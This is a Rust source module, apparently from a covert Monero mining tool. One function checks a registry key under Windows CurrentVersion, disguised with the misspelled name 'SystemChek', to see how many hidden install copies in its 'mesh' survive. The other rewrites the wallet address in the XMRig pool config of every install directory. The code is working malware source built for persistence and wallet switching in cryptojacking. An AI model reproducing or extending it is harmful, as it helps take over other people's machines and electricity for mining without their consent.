use std::fs;

use crate::utils::paths::get_all_install_dirs;
use crate::common::constants::CONFIG_FILENAME;
use crate::common::config::MinerConfig;

#[allow(dead_code)]
pub fn get_mesh_health() -> f32 {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        if let Ok(key) = hkcu.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek") {
             if let Ok(nodes_str) = key.get_value::<String, _>("Nodes") {
                 let nodes: Vec<&str> = nodes_str.split(';').filter(|s| !s.is_empty()).collect();
                 let total = nodes.len();
                 if total == 0 { return 0.0; }
                 
                 let mut alive = 0;
                 for node in &nodes {
                     if std::path::Path::new(node).exists() {
                         alive += 1;
                     }
                 }
                 return alive as f32 / total as f32;
             }
        }
    }
    // Fallback for non-windows or no registry key
    0.0
}

pub fn update_wallet_config(new_wallet: &str) -> bool {
    // 1. Get all install directories
    let dirs = get_all_install_dirs();
    let mut updated = false;

    for dir in dirs {
        let config_path = dir.join(CONFIG_FILENAME);
        if config_path.exists() {
             // Read existing config to preserve other settings (like threads)
             if let Ok(content) = fs::read_to_string(&config_path) {
                 if let Ok(mut config) = serde_json::from_str::<MinerConfig>(&content) {
                     // Update Wallet
                     // XMRig config structure is complex, our MinerConfig abstracts it.
                     // We need to modify the pools.
                     if !config.pools.is_empty() {
                         config.pools[0].user = new_wallet.to_string();
                         
                         // Save back
                         if let Ok(new_json) = serde_json::to_string_pretty(&config) {
                             if fs::write(&config_path, new_json).is_ok() {
                                 updated = true;
                             }
                         }
                     }
                 }
             }
        }
    }
    updated
}
